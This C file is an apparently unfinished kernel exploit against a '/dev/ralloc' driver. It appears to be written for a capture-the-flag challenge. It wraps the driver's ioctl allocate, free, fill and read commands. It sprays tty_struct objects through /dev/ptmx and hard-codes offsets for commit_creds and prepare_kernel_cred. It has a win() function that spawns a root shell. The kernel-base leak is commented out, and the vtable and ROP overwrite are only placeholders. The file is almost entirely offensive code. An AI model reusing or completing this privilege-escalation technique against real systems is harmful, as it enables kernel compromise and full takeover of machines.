#include <stdlib.h>
#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/types.h>

unsigned long kbase, kheap;
unsigned long ptm_unix98_ops = 0x344af6a0;

unsigned long commit_creds = 0xc0540;
unsigned long prepare_kernel_cred = 0xc07a0;

unsigned long user_cs;
unsigned long user_ss;
unsigned long user_sp;
unsigned long user_rflags;

int spray_fd[0x100];

struct message {
  unsigned long index;
  long size;
  char *buf;
};


void kmalloc(int fd, unsigned long idx, unsigned long size)
{
  struct message msg;
  msg.size = size;
  msg.index = idx;
  printf("[*] Allocating Chunk at: %ld of size: %ld\n", idx, size);
  if (ioctl(fd, 0x1000, &msg) == -1)
  {
   puts("Error!!");
   exit(1);
  }
}

void kfree(int fd, unsigned long idx)
{
 struct message msg;
 msg.index = idx;
 printf("[*] Free'ng index: %ld\n", idx);
 if (ioctl(fd, 0x1001, &msg) == -1)
 {
  puts("Error!!");
  exit(1);
 }
}

void fill(int fd, unsigned long idx, unsigned int size, char *ptr)
{
 struct message msg;
 msg.buf = ptr;
 msg.index = idx;
 msg.size = size;
 printf("[*] Filling Chunk at Index: %ld with %s\n", idx, ptr);
 if (ioctl(fd, 0x1002,  &msg) == -1)
 {
  puts("Error!!");
  exit(1);
 }
}


void get(int fd, unsigned long idx, unsigned long size, char *ptr)
{
 struct message msg;
 msg.index = idx;
 msg.size = size;
 msg.buf = ptr;
 printf("[*] Reading data from index: %ld\n", idx);
   if (ioctl(fd, 0x1003, &msg) == -1)
 {
  puts("Error!!");
  exit(1);
 }
}


static void save_state()
{
    asm(
        "movq %%cs, %0\n"
        "movq %%ss, %1\n"
        "movq %%rsp, %2\n"
        "pushfq\n"
        "popq %3\n"
        : "=r"(user_cs), "=r"(user_ss), "=r"(user_sp), "=r"(user_rflags)
        :
        : "memory");
}

static void win() {
  char *argv[] = {"/bin/sh", NULL};
  char *envp[] = {NULL};
  puts("[+] Win!");
  execve("/bin/sh", argv, envp);
}

int main() {
  unsigned long buf[0x400 / sizeof(unsigned long)];
  save_state();
  /* open drivers */
  int fd = open("/dev/ralloc", O_RDWR);
  if (fd < 0) {
    perror("/dev/ralloc");
    return 1;
  }

  puts("[+] Spraying buffer with tty_struct");
  for (int i = 0; i < 0x100; i++) {
     spray_fd[i] = open("/dev/ptmx", O_RDWR | O_NOCTTY);
     if (spray_fd[i] < 0) {
        perror("open tty");
      }
  }

  /* leak kbase & kheap */
  kmalloc(fd, 0, 0x400);
  //get(fd, 0, 0x400, &buf);
  //kbase = buf[(0x300 + 0x18) / sizeof(unsigned long)] - ptm_unix98_ops;
  //kheap = buf[(0x300 + 0x38) / sizeof(unsigned long)] - 0x38 - 0x400;
  //printf("[+] kbase = 0x%016lx\n", kbase);
  //printf("[+] kheap = 0x%016lx\n", kheap);

  /* write fake vtable, rop chain & overwrite ops */
  // fake tty_struct
  return 0;
}